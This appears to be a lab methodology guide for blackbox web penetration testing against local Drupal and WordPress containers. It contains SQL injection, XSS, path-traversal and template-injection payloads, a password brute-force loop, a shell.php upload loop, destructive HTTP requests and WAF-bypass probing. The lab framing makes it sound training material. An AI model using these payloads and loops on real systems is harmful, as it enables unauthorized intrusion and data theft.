# CYBER.LAB - Blackbox Testing Methodology & Guide

## Overview

Blackbox testing simulates an external attacker with **no prior knowledge** of the target system. Testing is performed from the outside looking in, using only publicly observable information.

---

## Blackbox vs. Whitebox Testing

| Aspect | Blackbox | Whitebox |
|--------|----------|----------|
| **Knowledge** | None (external) | Complete (internal) |
| **Realism** | High (real attacker) | Low (impossible attacker) |
| **Coverage** | External vulnerabilities | All vulnerabilities |
| **Time** | Longer (manual discovery) | Shorter (direct testing) |
| **Cost** | More expensive | Less expensive |
| **Goal** | Real vulnerability discovery | Complete coverage |

---

## Phase 1: Passive Reconnaissance

### 1.1 Information Gathering

**Without direct system access:**

```bash
# DNS lookup
nslookup localhost
dig localhost

# WHOIS information (if external)
whois example.com

# SSL certificate analysis
openssl s_client -connect localhost:443

# HTTP headers
curl -I http://localhost:8001

# robots.txt
curl http://localhost:8001/robots.txt

# sitemap.xml
curl http://localhost:8001/sitemap.xml

# .git folder
curl http://localhost:8001/.git/config
```

### 1.2 Technology Detection

Using the blackbox_scanner.py:

```bash
python scripts/blackbox_scanner.py http://localhost:8001
```

This detects:
- CMS type (Drupal, WordPress, etc.)
- Version information
- Server type
- Installed modules/plugins
- Available endpoints

---

## Phase 2: Active Reconnaissance

### 2.1 CMS Fingerprinting

```bash
# Drupal detection
curl -s http://localhost:8001/CHANGELOG.txt | head -5

# WordPress detection
curl -s http://localhost:8001/wp-json/ | jq .

# Check for admin paths
curl -I http://localhost:8001/admin
curl -I http://localhost:8001/wp-admin
```

### 2.2 Endpoint Detection

Common Drupal endpoints:
```
/user/login
/user/register
/admin
/node/1, /node/2, /node/3 (enumerate nodes)
/views/ajax
/rest/me
/jsonapi/user/user
```

Common WordPress endpoints:
```
/wp-admin
/wp-login.php
/wp-json/wp/v2/users
/wp-json/wp/v2/posts
/xmlrpc.php
```

### 2.3 Directory & File Enumeration

```bash
# Simple enumeration
for path in admin user login register;do
  echo "[*] Testing /admin"
  curl -s -o /dev/null -w "HTTP %{http_code}\n" http://localhost:8001/admin
done

# Using curl with common paths
common_paths=(
  "/admin"
  "/administrator"
  "/user"
  "/login"
  "/register"
  "/config"
  "/settings"
  "/api"
  "/services"
)

for path in "${common_paths[@]}"; do
  curl -s -o /dev/null -w "$path: HTTP %{http_code}\n" "http://localhost:8001$path"
done
```

---

## Phase 3: Vulnerability Assessment

### 3.1 Automated Vulnerability Scanning

```bash
# Run blackbox scanner
python scripts/blackbox_scanner.py http://localhost:8001

# Check results
cat blackbox_report.json | jq .vulnerabilities
```

### 3.2 Manual Testing Techniques

#### a) SQL Injection Testing (Blind)

```bash
# Test login form
curl -X POST http://localhost:8001/user/login \
  -d "name=' OR '1'='1&pass=test" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Response analysis
if grep -q "user\|dashboard\|logout" response.html; then
  echo "SQL Injection likely successful"
fi
```

#### b) Cross-Site Scripting (XSS)

```bash
# Test comment/form fields
curl -X POST http://localhost:8001/comment/add \
  -d "comment=<script>alert('XSS')</script>"

# Check if script reflected in response
```

#### c) Insecure Direct Object References (IDOR)

```bash
# Try accessing other users
curl http://localhost:8001/user/1
curl http://localhost:8001/user/2
curl http://localhost:8001/user/3

# Try accessing without authentication
curl -I http://localhost:8001/admin/users
```

#### d) Authentication Testing

```bash
# Brute force common credentials
for pass in password 123456 admin test qwerty;do
  curl -X POST http://localhost:8001/user/login \
    -d "name=admin&pass=$pass" \
    -c cookies.txt > /dev/null 2>&1
  
  if curl -b cookies.txt http://localhost:8001/admin | grep -q "logout"; then
    echo "[+] Found: admin:$pass"
    break
  fi
done
```

#### e) Session Token Analysis

```bash
# Extract session tokens
curl -v http://localhost:8001/admin 2>&1 | grep -i "set-cookie"

# Analyze token format
curl -c cookies.txt http://localhost:8001/admin
cat cookies.txt

# Test token reuse/prediction
```

---

## Phase 4: API Enumeration

### 4.1 REST API Discovery

```bash
# Common REST API paths
rest_paths=(
  "/api/v1"
  "/api/v2"
  "/rest"
  "/services"
  "/jsonapi"
  "/wp-json"
  "/graphql"
)

for path in "${rest_paths[@]}"; do
  echo "[*] Testing $path"
  curl -s "$http://localhost:8001$path" | head -5
done
```

### 4.2 API Testing

```bash
# List users via REST API
curl http://localhost:8001/jsonapi/user/user

# List posts
curl http://localhost:8001/jsonapi/node/article

# Try unauthorized access
curl http://localhost:8001/admin/users | jq .

# Test HTTP methods
curl -X DELETE http://localhost:8001/node/1
curl -X PATCH http://localhost:8001/node/1 -d '{"title":"hacked"}'
```

---

## Phase 5: Method-Specific Testing

### 5.1 HTTP Method Testing

```bash
# Check allowed methods
curl -X OPTIONS http://localhost:8001/admin -v

# Test dangerous methods
curl -X PUT http://localhost:8001/admin/config
curl -X DELETE http://localhost:8001/admin
curl -X PATCH http://localhost:8001/admin
```

### 5.2 File Upload Testing

```bash
# Find upload endpoints
upload_paths=(
  "/upload"
  "/file/upload"
  "/media/upload"
  "/files"
  "/attachments"
)

# Try uploading PHP file
for path in "${upload_paths[@]}"; do
  curl -F "file=@shell.php" "http://localhost:8001$path"
done
```

### 5.3 Input Validation Testing

```bash
# Test with various payloads
payloads=(
  "../../../etc/passwd"
  "../../windows/system32/config/sam"
  "<script>alert('XSS')</script>"
  "' OR '1'='1"
  "${{1+1}}"
  "{{7*7}}"
  "<?php phpinfo(); ?>"
)

for payload in "${payloads[@]}"; do
  echo "[*] Testing: $payload"
  curl "http://localhost:8001/search?q=${payload}"
done
```

---

## Phase 6: Evidence Collection

### 6.1 Automated Evidence

```bash
# Create blackbox testing report
python scripts/blackbox_scanner.py http://localhost:8001

# Review findings
cat blackbox_report.json
```

### 6.2 Manual Evidence

```bash
# Save HTTP responses
curl -v http://localhost:8001/admin 2>&1 | tee admin_response.txt

# Screen captures (using curl)
curl http://localhost:8001/admin > admin_page.html

# Create timeline
echo "$(date): Tested /admin endpoint" >> testing_timeline.txt
```

### 6.3 Log Collection

```bash
# From lab monitoring
docker logs drupal7-app > drupal_access.log
docker logs radware-simulator > waf_logs.log

# Export Kibana data
curl http://localhost:9200/nginx*/_search > elasticsearch_logs.json
```

---

## Testing Checklist

### Reconnaissance
- [ ] DNS information gathered
- [ ] HTTP headers analyzed
- [ ] robots.txt and sitemap.xml checked
- [ ] Technology detected (CMS, version)
- [ ] Server information identified

### Enumeration
- [ ] Endpoints discovered
- [ ] Admin paths identified
- [ ] Users enumerated
- [ ] API endpoints found
- [ ] File structure mapped

### Vulnerability Testing
- [ ] SQL injection tested
- [ ] XSS vulnerabilities checked
- [ ] CSRF protection verified
- [ ] Authentication tested
- [ ] Authorization tested
- [ ] File upload tested
- [ ] HTTP methods tested
- [ ] API security tested
- [ ] Session management tested
- [ ] Error handling analyzed

### Evidence Collection
- [ ] Screenshots taken
- [ ] HTTP responses saved
- [ ] Logs exported
- [ ] Timeline created
- [ ] Report generated

---

## Common Blackbox Testing Tools

```bash
# CMS Detection
python blackbox_scanner.py http://localhost:8001

# HTTP Fuzzing
ffuf -w common.txt -u http://localhost:8001/FUZZ

# Vulnerability Scanning
nikto -h localhost:8001

# API Testing
curl + jq combination
python scripts/blackbox_scanner.py

# Port Scanning
nmap localhost -p 8000-9000

# SSL Analysis
testssl.sh https://localhost:443
```

---

## Reporting Findings

### Report Structure

```json
{
  "target": "http://localhost:8001",
  "scan_date": "2026-02-22",
  "methodology": "Blackbox Testing",
  "findings": [
    {
      "vulnerability": "SQL Injection",
      "severity": "CRITICAL",
      "location": "/user/login",
      "description": "...",
      "proof": "...",
      "remediation": "..."
    }
  ]
}
```

---

## Lab Testing Workflow

### Test 1: Drupal Blackbox

```bash
# Start lab
cd lab && docker-compose up -d

# Run blackbox scan
python scripts/blackbox_scanner.py http://localhost:8001

# Review findings
cat blackbox_report.json | jq .vulnerabilities
```

### Test 2: WordPress Blackbox

```bash
# Scan WordPress
python scripts/blackbox_scanner.py http://localhost:8002

# Check REST API
curl http://localhost:8002/wp-json/wp/v2/users | jq .
```

### Test 3: WAF Bypass (Blackbox)

```bash
# Test through RADWARE simulator
python scripts/blackbox_scanner.py http://localhost:8000/drupal7/

# Analyze WAF response patterns
curl -v http://localhost:8000/drupal7/admin 2>&1 | grep -i "radware\|captcha"
```

---

## Key Principles

✓ **External perspective** - Test as if you're an attacker
✓ **Passive first** - Gather information without impact
✓ **Active second** - Only send test payloads after reconnaissance
✓ **Evidence collection** - Document everything
✓ **Systematic approach** - Follow methodology
✓ **Tool combination** - Use multiple techniques

---

## Additional Resources

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- Drupal Security: https://www.drupal.org/security
- WordPress Security: https://wordpress.org/support/article/hardening-wordpress/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework

